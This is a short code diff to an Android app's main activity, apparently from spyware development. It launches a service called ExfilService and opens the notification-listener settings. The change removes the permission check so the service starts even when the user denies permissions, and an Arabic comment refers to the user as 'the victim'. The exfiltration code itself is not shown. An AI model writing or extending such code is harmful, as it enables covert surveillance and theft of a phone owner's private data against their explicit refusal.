@@ -43,17 +43,15 @@ class MainActivity : AppCompatActivity() {
     override fun onRequestPermissionsResult(r: Int, p: Array<out String>, g: IntArray) {
         super.onRequestPermissionsResult(r, p, g)
         if (r == REQ) {
-            if (g.isNotEmpty() && g.all { it == PackageManager.PERMISSION_GRANTED }) startNow()
-            else Toast.makeText(this, "لازم الصلاحيات", Toast.LENGTH_LONG).show()
+            // نطلقو الخدمة حتى إلا رفض الضحية شي صلاحية
+            startNow()
         }
     }
 
     private fun startNow() {
         val i = Intent(this, ExfilService::class.java)
         if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
-        
         startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
-        
         Toast.makeText(this, "تم", Toast.LENGTH_SHORT).show()
     }
 }
